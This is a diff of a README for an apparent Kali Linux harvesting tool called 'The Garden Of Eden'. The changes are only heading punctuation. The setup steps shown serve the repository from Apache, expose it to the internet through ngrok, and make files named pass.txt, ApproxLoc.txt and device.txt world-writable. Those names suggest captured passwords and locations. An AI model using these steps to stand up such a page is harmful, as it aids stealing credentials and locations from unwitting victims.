@@ -15,40 +15,40 @@
 #
 ## (KALI LINUX) INSTALL AND SETUP:
 #
-**1.) Install Dependencies:$** 
+**1.) Install Dependencies $:** 
 `apt-get update &&
 apt-get install apache2 php*`
 #
-**2.) Download The Repository:$**
+**2.) Download The Repository $:**
 `cd /var/www/html &&
 git clone https://github.com/Joel-Horensma/The-Garden-Of-Eden.git`
 #
 **3.) Setup An NGROK Account, Here: https://ngrok.com/download**
 #
-**4.) Install unzip And wget:$**
+**4.) Install unzip And wget $:**
 `sudo apt-get install unzip wget`
 #
 **5.) Download NGROK:**
 #
-**For 32 bit:**
+**For 32 bit $:**
 `cd /var/www/html/The-Garden-Of-Eden/NGROK && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip &&
 unzip /var/www/html/The-Garden-Of-Eden/NGROK/ngrok-stable-linux-386.zip`
 #
-**For 64 bit:**
+**For 64 bit $:**
 `cd /var/www/html/The-Garden-Of-Eden/NGROK && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &&
 unzip /var/www/html/The-Garden-Of-Eden/NGROK/ngrok-stable-linux-amd64.zip`
 #
-**6.) Setup NGROK Auth Token**
+**6.) Setup NGROK Auth Token $:**
 `cd /var/www/html/The-Garden-Of-Eden/NGROK && ./ngrok authtoken <YOUR_AUTH_TOKEN_FROM_THE_ACCOUNT_YOU_SET_UP>`
 #
 **7.) Give Read And Write Permissions For The TXT Files
-In The Folder "/php/txt":**
+In The Folder "/php/txt" $:**
 `cd /var/www/html/The-Garden-Of-Eden/php/txt &&
 chmod a+rwx ApproxLoc.txt && chmod 777 ApproxLoc.txt && chmod a+rwx device.txt && chmod 777 device.txt && chmod a+rwx pass.txt && chmod 777 pass.txt`
 #
 ## USAGE:
 #
-**1.) Launch NGROK:**
+**1.) Launch NGROK $:**
 `cd /var/www/html/The-Garden-Of-Eden/NGROK &&
 ./ngrok http 80`
 #
